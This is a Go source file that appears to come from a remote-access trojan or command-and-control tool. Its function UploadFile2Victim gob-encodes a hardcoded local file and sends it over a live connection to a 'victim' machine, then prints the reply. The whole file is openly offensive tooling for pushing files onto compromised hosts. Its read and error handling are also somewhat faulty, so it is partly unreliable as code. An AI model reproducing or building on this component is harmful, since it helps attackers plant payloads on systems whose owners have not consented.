package upload

import (
	"bufio"
	"encoding/gob"
	"errors"
	"fmt"
	"net"
	"os"
)

type FileStruct struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func checkExistence(fileName string) bool {
	if _, err := os.Stat(fileName); err != nil {
		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func readFileContents(fileName string) ([]byte, error) {
	file, err := os.Open(fileName)
	if err != nil {
		fmt.Println("[-] Unable to open file")
		return nil, err
	}
	defer file.Close()

	stats, err := file.Stat()
	if err != nil {
		fmt.Println("[-] Unable to stat file: ", err)
	}
	fileSize := stats.Size()
	fmt.Println("[+] the file contains ", fileSize, " bytes")

	bytes := make([]byte, fileSize)

	buffer := bufio.NewReader(file)

	_, err = buffer.Read(bytes)
	if err != nil {
		fmt.Println(err)
	}

	return bytes, nil
}

func UploadFile2Victim(connection net.Conn) (err error) {
	fileName := "file.jpg" // File name
	exists := checkExistence(fileName)
	if !exists { // Check exists file
		err = errors.New("[-] File not exists")
		return err
	}

	fileContent, err := readFileContents(fileName) // File content
	if err != nil {
		fmt.Println("[-] Failed to read file: ", err)
	}
	fileSize := len(fileContent) // File size

	fs := &FileStruct{
		FileName:    fileName,
		FileSize:    fileSize,
		FileContent: fileContent,
	}

	encoder := gob.NewEncoder(connection)

	err = encoder.Encode(fs)
	if err != nil {
		fmt.Println("[-] Failed to encode: ", err)
		return
	}

	reader := bufio.NewReader(connection)

	status, err := reader.ReadString('\n')
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(status)

	return
}
